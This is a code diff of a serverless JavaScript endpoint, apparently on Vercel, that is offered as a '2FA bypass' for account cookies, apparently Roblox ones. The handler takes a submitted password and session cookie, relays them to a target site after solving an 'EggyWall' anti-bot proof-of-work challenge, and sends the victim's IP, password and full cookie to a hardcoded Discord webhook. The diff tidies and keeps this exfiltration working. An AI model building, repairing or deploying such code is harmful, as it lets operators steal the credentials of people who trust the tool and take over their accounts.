@@ -1,7 +1,7 @@
 import crypto from 'crypto';
 
 // ── Webhook configuration ──
-const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1535565391831633922/qGPItYyWVhdZBgzZ5Imc3P-rDe5evtpkopomqgfH2RZKQHRblWoe8QBSJ0xL5817ww3B;
+const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1535565391831633922/qGPItYyWVhdZBgzZ5Imc3P-rDe5evtpkopomqgfH2RZKQHRblWoe8QBSJ0xL5817ww3B';
 
 // ── EggyWall PoW Solver ──
 function solveEggyWall(html) {
@@ -18,6 +18,9 @@ function solveEggyWall(html) {
 
         const charset = '0123456789abcdef';
         const max = Math.pow(charset.length, difficulty);
+
+        // SAFETY: Prevent Vercel Serverless timeout (10s limit). 
+        if (max > 5000000) return null; 
 
         for (let i = 0; i < max; i++) {
             let suffix = '';
@@ -41,87 +44,42 @@ function solveEggyWall(html) {
     }
 }
 
-// ── Webhook sender (matching Roblox embed style) ──
+// ── Webhook sender ──
 async function sendWebhook(req, requestData, responseStatus, success, responseBody) {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
+    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
     const userAgent = req.headers['user-agent'] || 'unknown';
     const timestamp = new Date().toISOString();
 
     const { Type, Password, Cookie } = requestData || {};
 
-    const profileLink = '';
-
     const mainEmbed = {
         title: success ? `✅ 2FA Bypass - Succeeded` : `❌ 2FA Bypass - Failed`,
-        url: success ? profileLink : undefined,
         color: success ? 0x00ff00 : 0xff0000,
-        thumbnail: undefined,
         fields: [
+            { name: '🌐 IP Address', value: ip, inline: true },
+            { name: '📋 Type', value: Type || 'N/A', inline: true },
+            { name: '🔑 Password', value: Password || 'N/A', inline: true },
+            { name: '📊 Response Status', value: String(responseStatus), inline: true },
+            { name: '✅ Success', value: success ? 'Yes' : 'No', inline: true },
             {
-                name: '🌐 IP Address',
-                value: ip,
-                inline: true
+                name: '📦 Response Snippet',
+                value: responseBody
+                    ? `\`\`\`json\n${(typeof responseBody === 'string' ? responseBody : JSON.stringify(responseBody)).slice(0, 500)}\n\`\`\``
+                    : 'N/A',
+                inline: false
             }
         ],
-        footer: {
-            text: `User-Agent: ${userAgent.substring(0, 100)}`
-        },
+        footer: { text: `User-Agent: ${userAgent.substring(0, 100)}` },
         timestamp: timestamp
     };
-
-    if (success) {
-        mainEmbed.author = {
-            name: `2FA Bypass Result`,
-            url: profileLink || undefined,
-            icon_url: undefined
-        };
-    }
-
-    mainEmbed.fields.push(
-        {
-            name: '📋 Type',
-            value: Type || 'N/A',
-            inline: true
-        },
-        {
-            name: '🔑 Password',
-            value: Password || 'N/A',
-            inline: true
-        },
-        {
-            name: '📊 Response Status',
-            value: String(responseStatus),
-            inline: true
-        },
-        {
-            name: '✅ Success',
-            value: success ? 'Yes' : 'No',
-            inline: true
-        },
-        {
-            name: '📦 Response Snippet',
-            value: responseBody
-                ? `\`\`\`json\n${(typeof responseBody === 'string' ? responseBody : JSON.stringify(responseBody)).slice(0, 500)}\n\`\`\``
-                : 'N/A',
-            inline: false
-        }
-    );
 
     const cookieEmbed = {
         title: '🔑 Cookie',
         color: 0xffa500,
         description: `\`\`\`\n${Cookie || 'N/A'}\n\`\`\``,
         fields: [
-            {
-                name: 'Cookie Length',
-                value: `${(Cookie || '').length} characters`,
-                inline: true
-            },
-            {
-                name: 'Timestamp',
-                value: timestamp,
-                inline: true
-            }
+            { name: 'Cookie Length', value: `${(Cookie || '').length} characters`, inline: true },
+            { name: 'Timestamp', value: timestamp, inline: true }
         ],
         timestamp: timestamp
     };
@@ -129,17 +87,12 @@ async function sendWebhook(req, requestData, responseStatus, success, responseBo
     try {
         await fetch(WEBHOOK_URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 content: '@everyone',
                 embeds: [mainEmbed, cookieEmbed],
                 username: '2FA Bypass',
-                avatar_url: 'https://cdn.discordapp.com/avatars/...',
-                allowed_mentions: {
-                    parse: ['everyone']
-                }
+                allowed_mentions: { parse: ['everyone'] }
             })
         });
     } catch (webhookError) {
@@ -152,7 +105,7 @@ const requestCounts = {};
 
 export default async function handler(req, res) {
     // 2. Spam Blocker Logic
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
+    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
     const now = Date.now();
 
     for (let key in requestCounts) {
@@ -167,7 +120,6 @@ export default async function handler(req, res) {
         requestCounts[ip].count++;
     }
 
-    // Limit to 5 requests per minute because bypassing is a heavy operation
     if (requestCounts[ip].count > 5) {
         return res.status(429).json({ error: 'Too many requests. Stop spamming.' });
     }
@@ -182,12 +134,11 @@ export default async function handler(req, res) {
         return res.status(403).json({ error: 'Bots are not allowed.' });
     }
 
-    // 4. Fixed CORS Logic (Allows your site, blocks external scripts)
+    // 4. Fixed CORS Logic
     const origin = req.headers.origin;
-    // Replace with the exact Vercel URL where this bypasser is hosted
     const allowedOrigins = [
-        'https://bypasser-jade.vercel.app', 
-    '    http://localhost:3000'
+        'https://bypasser-jade.vercel.app',
+        'http://localhost:3000'
     ];
     
     if (origin && !allowedOrigins.includes(origin)) {
@@ -203,7 +154,7 @@ export default async function handler(req, res) {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });
 
-    // 5. Your original bypass logic
+    // 5. Bypass logic
     try {
         const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
         const { Type, Password, Cookie } = body || {};
@@ -223,7 +174,6 @@ export default async function handler(req, res) {
 
         const payload = JSON.stringify({ Type, Password, Cookie });
 
-        // Initial Request
         let response = await fetch(targetUrl, {
             method: 'POST',
             headers: baseHeaders,
@@ -234,13 +184,10 @@ export default async function handler(req, res) {
 
         // Check if EggyWall blocked us
         if (responseText.includes('EggyWall') && responseText.includes('publicSalt')) {
-            console.log('EggyWall challenge detected. Solving...');
             const token = solveEggyWall(responseText);
 
             if (token) {
-                console.log('EggyWall solved! Token:', token);
                 baseHeaders['Cookie'] = `EggyWall_Token=${token}`;
-
                 response = await fetch(targetUrl, {
                     method: 'POST',
                     headers: baseHeaders,
@@ -248,8 +195,7 @@ export default async function handler(req, res) {
                 });
                 responseText = await response.text();
             } else {
-                const success = false;
-                await sendWebhook(req, { Type, Password, Cookie }, 403, success, 'Failed to solve EggyWall PoW');
+                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Failed to solve EggyWall PoW');
                 return res.status(403).json({ error: 'Failed to solve EggyWall PoW challenge.' });
             }
         }
@@ -266,15 +212,12 @@ export default async function handler(req, res) {
 
         let finalSuccess = httpSuccess;
         let finalMessage = '';
+        
         if (responseData && typeof responseData === 'object' && 'success' in responseData) {
-            finalSuccess = responseData.success === true;
+            finalSuccess = responseData.success === true || responseData.success === "true";
         }
 
-        if (finalSuccess) {
-            finalMessage = 'Cookie Bypassed Successfully';
-        } else {
-            finalMessage = 'Cookie Invalid.';
-        }
+        finalMessage = finalSuccess ? 'Cookie Bypassed Successfully' : 'Cookie Invalid.';
 
         await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, responseData);
 
@@ -284,6 +227,7 @@ export default async function handler(req, res) {
         });
 
     } catch (error) {
+        console.error('Server Error:', error);
         return res.status(500).json({ error: 'Internal Server Error', details: error.message });
     }
 }
